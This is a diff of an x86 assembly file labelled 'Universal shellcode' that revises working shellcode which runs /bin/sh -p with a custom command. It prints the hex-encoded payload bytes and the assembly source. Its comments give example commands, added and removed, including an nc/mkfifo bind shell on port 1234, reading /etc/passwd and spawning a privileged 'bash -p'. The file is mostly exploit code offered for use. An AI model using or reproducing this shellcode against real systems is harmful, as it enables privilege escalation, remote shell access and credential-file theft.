@@ -1,55 +1,63 @@
+	#	Assembly code to invoke a custom command (x86)	#
+	#	a.k.a. "Universal shellcode"			#
+	#	(by Daniel Henry-Mantilla)			#
+
 # char shellcode[] =
-# "\x31\xc0\x66\xb8\x2d\x63\x50\x89\xe3\xb4\x70\x50\x89\xe1\x99\x52\xeb\x2d\x8b\x34\x24\xeb\x01\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x51\x50\x8d\x5c\x24\xf8\x89\x1c\x24\x89\xe1\x68\x2f\x73\x68\xff\x88\x54\x24\x03\x68\x2f\x62\x69\x6e\x30\xe4\xb0\x0b\xcd\x80\xe8\xce\xff\xff\xff\
-# rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -p -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f; rm -f /tmp/f#";
+#  "\x31\xc0\xb0\x0b\xbb\xd3\x8f\x9c\xff\xf7\xdb\x53\x89\xe3\x99\x52\xeb\x20\x8b\x34\x24\x46\x80\x3e\x23\x75\xfa\x88\x16\x53\x8d\x5c\x24\xf0\x53\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xcd\x80\xe8\xdb\xff\xff\xff"\
+#  "custom_cmd"\
+#  "#"; // Terminator (required /!\)
 
-# Total length of the shellcode = 69 + custom_cmd
-# 68 bytes (prefix) + length(custom_cmd) + 1 (its terminating char)
+# custom_cmd examples:
+# 1: "echo 'Shell spawned successfully!' && bash -p"\
+# 2: "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -p -i 2>&1 | nc -lp 1234 > /tmp/f; rm -f /tmp/f"\
+# 3: "cat .passwd"\
+# 4: "cat /etc/passwd && /etc/shallow"\
 
-	.set END, 0x23		# terminating char (e.g, '!')
+# Total length of the shellcode = 59 + custom_cmd_length
+# Since 59 = 58 (prefix_length) + 1 (terminating char)
+
+	.set END, 0x23		# terminating char (e.g, '#')
 .text
 .globl _start
 _start:
 	xorl %eax, %eax
+	movb $0xb, %al		# sys_execve
 
-	mov $0x632d, %ax	# -c
-	pushl %eax
-	movl %esp, %ebx		# address of "-c"
+	mov $0xff9c8fd3, %ebx
+	neg %ebx		# '-pc'
+	pushl %ebx
+	movl %esp, %ebx		# address of "-pc"
 
-	movb $0x70, %ah		# -p
-	pushl %eax
-	movl %esp, %ecx		# address of "-p"
-
-	cdq			# %edx = 0 = NULL
-	push %edx		# NULL terminator of argv[]
+	cdq			# env = %edx = NULL
+	pushl %edx		# NULL terminator of argv[]
 
 	jmp cmd
 	back:
 	movl (%esp), %esi	# address of custom cmd
-	jmp test
+
+#	jmp test		# Uncomment to handle empty commands
 	loop:
 	inc %esi
 	test:
 	cmpb $END, (%esi)
 	jne loop
-	movb %dl, (%esi)
+	movb %dl, (%esi)	# Custom cmd is now '\0'-terminated
 
-	pushl %ebx		# address of "-c"
-	pushl %ecx		# address of "-p"
+	pushl %ebx		# address of "-pc"
 
-	pushl %eax		# sub $4, %esp
-	lea -0x8(%esp), %ebx	# address of "/bin/sh"
-	movl %ebx, (%esp)	# and that's why we substracted $4
+	lea -0x10(%esp), %ebx	# address of "/bin/sh"
+	pushl %ebx
 	movl %esp, %ecx		# argv
 
-	pushl $0xff68732f	# /sh
-	movb %dl, 0x3(%esp)	# '\0' terminator
-	pushl $0x6e69622f	# /bin
+	pushl %edx		# "" (null-terminator)
+	pushl $0x68732f2f	# '//sh'
+	pushl $0x6e69622f	# '/bin'
 
-	xor %ah, %ah
-	movb $0xb, %al
 	int $0x80
 cmd:
 	call back
-	.ascii "echo Hello World! && id#"
+	# Custom command here #
+	.ascii "echo 'Shell spawned successfully!' && bash -p"
+	.ascii "#"		# /!\ String terminator #
 
 
